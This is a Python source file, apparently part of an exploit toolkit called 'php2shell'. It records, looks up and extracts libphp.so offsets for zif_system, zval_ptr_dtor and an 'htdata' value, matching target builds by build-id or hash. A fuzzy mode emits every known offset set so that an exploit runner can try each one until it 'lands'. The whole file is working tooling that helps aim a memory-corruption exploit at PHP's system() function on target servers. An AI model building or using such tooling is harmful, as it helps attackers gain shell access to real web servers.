#!/usr/bin/env python3
"""
php2shell offset database tool -- look up / derive / record libphp.so offsets.

Instead of re-deriving offsets every run, keep a small database (offsets_db.json)
keyed by the binary's identity. Then a target can be resolved two ways:

  EXACT  -- you have a copy of the target's libphp.so (or the same distro .deb):
            match by GNU build-id (or sha256). Works even on a STRIPPED target.
  FUZZY  -- "wordlist" mode: by PHP version, list every known offset triple so a
            runner can try each until one lands (see run_db.sh).

Subcommands:
  list                          show the database
  id      --libphp PATH         print a build's build-id + sha256
  resolve --libphp PATH         exact lookup -> flags (or --emit env)
  resolve --php 8.3  [--all]    fuzzy lookup -> candidate flags, one per line
  extract --libphp PATH         read zif/dtor from the .so's symbols (fallback),
                                 optionally --add it to the DB (--php, --htdata, --source)

Emit formats (--emit): "flags" (default) -> "--zif-offset 0x.. --dtor-offset 0x.. --htdata-offset 0x..",
                       "env" -> ZIF_OFFSET=.. DTOR_OFFSET=.. HTDATA_OFFSET=..
"""
import argparse, hashlib, json, os, struct, sys

HERE = os.path.dirname(os.path.abspath(__file__))
DB_PATH = os.path.join(HERE, "offsets_db.json")
REPO_DOCKER = os.path.join(HERE, "..", "exploit", "engine", "docker")


def load_db():
    with open(DB_PATH) as f:
        return json.load(f)


def save_db(db):
    with open(DB_PATH, "w") as f:
        json.dump(db, f, indent=2)
        f.write("\n")


def build_id(path):
    """GNU build-id hex from .note.gnu.build-id (via PT_NOTE), or ''."""
    d = open(path, "rb").read()
    if d[:4] != b"\x7fELF":
        return ""
    e_phoff, = struct.unpack_from("<Q", d, 0x20)
    phentsize, phnum = struct.unpack_from("<HH", d, 0x36)
    for i in range(phnum):
        o = e_phoff + i * phentsize
        ptype, = struct.unpack_from("<I", d, o)
        if ptype != 4:          # PT_NOTE
            continue
        poff, = struct.unpack_from("<Q", d, o + 8)
        psz, = struct.unpack_from("<Q", d, o + 32)
        p, end = poff, poff + psz
        while p < end:
            nsz, dsz, ntype = struct.unpack_from("<III", d, p)
            name = d[p + 12:p + 12 + nsz].rstrip(b"\x00")
            doff = p + 12 + ((nsz + 3) & ~3)
            if name == b"GNU" and ntype == 3:
                return d[doff:doff + dsz].hex()
            p = doff + ((dsz + 3) & ~3)
    return ""


def sha256(path):
    h = hashlib.sha256()
    with open(path, "rb") as f:
        for b in iter(lambda: f.read(1 << 20), b""):
            h.update(b)
    return h.hexdigest()


def extract_symbols(path):
    """(zif_off, dtor_off) from the .so's symbol table, or None if stripped."""
    sys.path.insert(0, os.path.abspath(REPO_DOCKER))
    from offsets import parse_elf
    try:
        bias, s = parse_elf(path)
    except SystemExit:
        return None
    return s["zif_system"] - bias, s["zval_ptr_dtor"] - bias


def emit(e, fmt):
    zif, dtor, htd = e["zif_offset"], e["dtor_offset"], e.get("htdata_offset")
    if fmt == "env":
        out = f"ZIF_OFFSET={zif}\nDTOR_OFFSET={dtor}\n"
        if htd:
            out += f"HTDATA_OFFSET={htd}\n"
        return out.rstrip("\n")
    flags = f"--zif-offset {zif} --dtor-offset {dtor}"
    if htd:
        flags += f" --htdata-offset {htd}"
    return flags


def find_exact(db, bid, sha):
    for e in db["entries"]:
        if bid and e.get("build_id") and e["build_id"].lower() == bid.lower():
            return e
    for e in db["entries"]:
        if sha and e.get("sha256") and e["sha256"].lower() == sha.lower():
            return e
    return None


def find_by_version(db, ver):
    # match full version, else the 8.x minor prefix
    exact = [e for e in db["entries"] if e["php_version"] == ver]
    if exact:
        return exact
    minor = ".".join(ver.split(".")[:2])
    return [e for e in db["entries"] if e["php_version"].startswith(minor + ".") or e["php_version"] == minor]


def main():
    ap = argparse.ArgumentParser(description="php2shell offset database tool")
    sub = ap.add_subparsers(dest="cmd", required=True)

    sub.add_parser("list")

    pi = sub.add_parser("id");       pi.add_argument("--libphp", required=True)

    pr = sub.add_parser("resolve")
    pr.add_argument("--libphp"); pr.add_argument("--php")
    pr.add_argument("--all", action="store_true", help="fuzzy: print ALL candidates for the version")
    pr.add_argument("--emit", choices=("flags", "env"), default="flags")

    pe = sub.add_parser("extract")
    pe.add_argument("--libphp", required=True)
    pe.add_argument("--emit", choices=("flags", "env"), default="flags")
    pe.add_argument("--add", action="store_true", help="append this build to the DB")
    pe.add_argument("--php", default="", help="php_version for --add")
    pe.add_argument("--htdata", default="", help="htdata offset for --add (e.g. 0x690D8)")
    pe.add_argument("--source", default="unknown", help="source label for --add")
    a = ap.parse_args()
    db = load_db()

    if a.cmd == "list":
        print(f"{'php_version':12} {'ht':>8} {'zif':>10} {'dtor':>10} {'ver?':5} source / build_id")
        for e in db["entries"]:
            print(f"{e['php_version']:12} {str(e.get('htdata_offset')):>8} "
                  f"{e['zif_offset']:>10} {e['dtor_offset']:>10} "
                  f"{'yes' if e.get('verified') else 'no':5} {e.get('source','')}")
            print(f"{'':12} build_id={e.get('build_id','')}")
        return 0

    if a.cmd == "id":
        print(f"build_id  {build_id(a.libphp)}")
        print(f"sha256    {sha256(a.libphp)}")
        return 0

    if a.cmd == "resolve":
        if a.libphp:
            bid, sha = build_id(a.libphp), sha256(a.libphp)
            e = find_exact(db, bid, sha)
            if not e:
                print(f"[-] no DB entry for build_id={bid or '?'} / sha256={sha[:16]}..",
                      file=sys.stderr)
                print("    try:  p2s_offsets.py extract --libphp %s --add --php <ver> --htdata 0x.." % a.libphp,
                      file=sys.stderr)
                return 3
            if not e.get("htdata_offset"):
                print(f"[-] matched {e['php_version']} ({e.get('source')}) but htdata not profiled "
                      f"(chain unsupported on this build)", file=sys.stderr)
                return 4
            print(emit(e, a.emit))
            return 0
        if a.php:
            cands = find_by_version(db, a.php)
            cands = [e for e in cands if e.get("htdata_offset")]
            if not cands:
                print(f"[-] no usable DB entry for PHP {a.php}", file=sys.stderr)
                return 3
            if not a.all:
                cands = cands[:1]
            for e in cands:
                print(emit(e, a.emit))
            return 0
        if a.all:
            # no --libphp, no --php: emit EVERY usable offset set (try-them-all)
            cands = [e for e in db["entries"] if e.get("htdata_offset")]
            if not cands:
                print("[-] database has no usable entries", file=sys.stderr)
                return 3
            for e in cands:
                print(emit(e, a.emit))
            return 0
        print("resolve needs --libphp, --php, or --all", file=sys.stderr)
        return 2

    if a.cmd == "extract":
        r = extract_symbols(a.libphp)
        if not r:
            print("[-] libphp.so is stripped; symbols zif_system/zval_ptr_dtor not present.",
                  file=sys.stderr)
            return 2
        zif, dtor = r
        e = {"php_version": a.php or "unknown", "source": a.source,
             "build_id": build_id(a.libphp), "sha256": sha256(a.libphp),
             "zif_offset": f"0x{zif:x}", "dtor_offset": f"0x{dtor:x}",
             "htdata_offset": a.htdata or None,
             "verified": False}
        print(emit(e, a.emit))
        if a.add:
            db["entries"].append(e)
            save_db(db)
            print(f"[+] added to {DB_PATH}", file=sys.stderr)
        return 0


if __name__ == "__main__":
    sys.exit(main())
